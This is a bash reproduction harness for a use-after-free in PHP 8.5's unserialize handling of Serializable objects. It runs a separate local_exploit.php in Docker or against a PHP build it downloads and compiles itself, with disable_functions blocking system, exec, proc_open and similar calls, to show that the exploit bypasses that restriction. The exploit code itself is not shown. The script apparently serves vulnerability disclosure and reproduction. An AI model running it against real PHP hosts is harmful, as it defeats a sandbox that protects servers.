#!/usr/bin/env bash
#
# Reproduce the PHP unserialize Serializable var_hash UAF.
#
# Two modes:
#   docker  Run local_exploit.php inside the official php:8.5-cli image
#           (no toolchain needed; verified on linux/amd64 and linux/arm64).
#   run     Build PHP 8.5.5 (NTS, CLI) from the official tarball into
#           /tmp/php-8.5.5 and run the exploit against that binary.
#
# Both invoke php with disable_functions set to demonstrate the bypass.

set -euo pipefail

PHP_VERSION="${PHP_VERSION:-8.5.5}"
SRC_DIR="${SRC_DIR:-/tmp/php-${PHP_VERSION}}"
PHP_BIN="${SRC_DIR}/sapi/cli/php"
HERE="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

DISABLED='system,shell_exec,passthru,exec,popen,proc_open,pcntl_exec'
EXPLOIT="${HERE}/local_exploit.php"

DOCKER_IMAGE="${DOCKER_IMAGE:-php:8.5-cli}"
PLATFORM="${PLATFORM:-}"

run_docker() {
    echo "[*] Image:    ${DOCKER_IMAGE}${PLATFORM:+ (${PLATFORM})}"
    echo "[*] Disabled: ${DISABLED}"
    echo
    echo "[*] Running exploit..."
    echo "─────────────────────────────────────────────────────────────"
    docker run --rm ${PLATFORM:+--platform "${PLATFORM}"} \
        -v "${EXPLOIT}:/exploit.php:ro" \
        "${DOCKER_IMAGE}" \
        php -d "disable_functions=${DISABLED}" /exploit.php
    echo "─────────────────────────────────────────────────────────────"
}

build_php() {
    if [[ -x "${PHP_BIN}" ]]; then
        echo "[*] PHP already built at ${PHP_BIN}"
        return
    fi

    echo "[*] Fetching PHP ${PHP_VERSION} source..."
    mkdir -p "$(dirname "${SRC_DIR}")"
    cd "$(dirname "${SRC_DIR}")"
    if [[ ! -f "php-${PHP_VERSION}.tar.gz" ]]; then
        curl -fsSL "https://www.php.net/distributions/php-${PHP_VERSION}.tar.gz" \
            -o "php-${PHP_VERSION}.tar.gz"
    fi
    if [[ ! -d "${SRC_DIR}" ]]; then
        tar xzf "php-${PHP_VERSION}.tar.gz"
    fi

    echo "[*] Configuring (CLI only, no extensions)..."
    cd "${SRC_DIR}"
    ./configure \
        --prefix="${SRC_DIR}/_install" \
        --disable-all --disable-cgi --disable-fpm \
        --enable-cli --without-pear --disable-phpdbg \
        > "${SRC_DIR}/configure.log" 2>&1

    echo "[*] Building (this takes a few minutes)..."
    make -j"$(nproc)" > "${SRC_DIR}/build.log" 2>&1
}

run_exploit() {
    echo "[*] PHP version:"
    "${PHP_BIN}" --version
    echo

    echo "[*] Architecture: $(uname -m)"
    echo "[*] Disabled:     ${DISABLED}"
    echo "[*] ASLR setting: $(cat /proc/sys/kernel/randomize_va_space 2>/dev/null || echo unknown)"
    echo

    echo "[*] Running exploit..."
    echo "─────────────────────────────────────────────────────────────"
    "${PHP_BIN}" -d "disable_functions=${DISABLED}" "${EXPLOIT}"
    echo "─────────────────────────────────────────────────────────────"
}

case "${1:-docker}" in
    docker) run_docker ;;
    build)  build_php ;;
    run)    build_php; run_exploit ;;
    clean)  rm -rf "${SRC_DIR}" "$(dirname "${SRC_DIR}")/php-${PHP_VERSION}.tar.gz" ;;
    *)
        cat <<EOF
Usage: $0 [docker|build|run|clean]

  docker  Run the exploit inside ${DOCKER_IMAGE} (default; no toolchain needed)
  build   Download and build PHP ${PHP_VERSION} into ${SRC_DIR}
  run     Build if needed, then run the exploit against the local build
  clean   Remove the PHP build tree and tarball

Environment:
  DOCKER_IMAGE  Image for docker mode (default: ${DOCKER_IMAGE})
  PLATFORM      Docker platform, e.g. linux/amd64 or linux/arm64 (default: native)
  PHP_VERSION   PHP version to build for run mode (default: ${PHP_VERSION})
  SRC_DIR       Source/build directory (default: ${SRC_DIR})
EOF
        exit 2
        ;;
esac
